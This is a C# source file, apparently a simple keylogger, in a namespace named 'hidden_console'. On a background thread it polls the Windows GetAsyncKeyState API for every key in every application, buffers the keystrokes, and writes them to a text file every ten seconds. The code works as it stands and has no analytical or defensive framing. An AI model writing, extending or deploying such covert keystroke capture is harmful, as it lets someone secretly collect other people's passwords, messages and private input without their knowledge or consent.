using System;
using System.IO;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace hidden_console
{
    public static class KeyHook
    {
        public static event KeyEventDelegate OnKeyDown;
        public static event KeyEventDelegate OnKeyUp;
        public delegate void KeyEventDelegate(Keys key);

        private static DateTime _ticks = DateTime.Now;
        private static Thread _pollingThread;
        private static string _buffer = string.Empty;
        private static string _projectDirectory = $@"{Directory.GetCurrentDirectory()}\..\..\";
        private static volatile Dictionary<Keys, bool> _keysStates = new Dictionary<Keys, bool>();
        private static Dictionary<Keys, string> _commonKeysConverter = new Dictionary<Keys, string>
        {
            { Keys.Space, " " },
            { Keys.Enter, "\r\n" }
        };

        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        internal static void Initialize()
        {
            if (_pollingThread != null && _pollingThread.IsAlive)
                return;
            foreach (Keys key in Enum.GetValues(typeof(Keys)))
                _keysStates[key] = false;
            _pollingThread = new Thread(PollKeys)
            {
                IsBackground = true,
                Name = "KeyThread"
            };
            _pollingThread.Start();
        }

        private static void PollKeys()
        {
            for (;;)
            {
                Thread.Sleep(10);
                foreach (Keys key in Enum.GetValues(typeof(Keys)))
                {
                    if (((GetAsyncKeyState(key) & (1 << 15)) != 0))
                    {
                        if (_keysStates[key])
                            continue;
                        OnKeyDown?.Invoke(key);
                        _buffer += _commonKeysConverter.ContainsKey(key) ? _commonKeysConverter[key] : key.ToString();
                        _keysStates[key] = true;
                    }
                    else
                    {
                        if (!_keysStates[key])
                            continue;
                        OnKeyUp?.Invoke(key);
                        _keysStates[key] = false;
                    }
                }

                if ((DateTime.Now - _ticks).TotalSeconds > 10)
                {
                    File.WriteAllText($"{_projectDirectory}test.txt", _buffer);
                    _buffer = string.Empty;
                    _ticks = DateTime.Now;
                }
            }
        }
    }
}
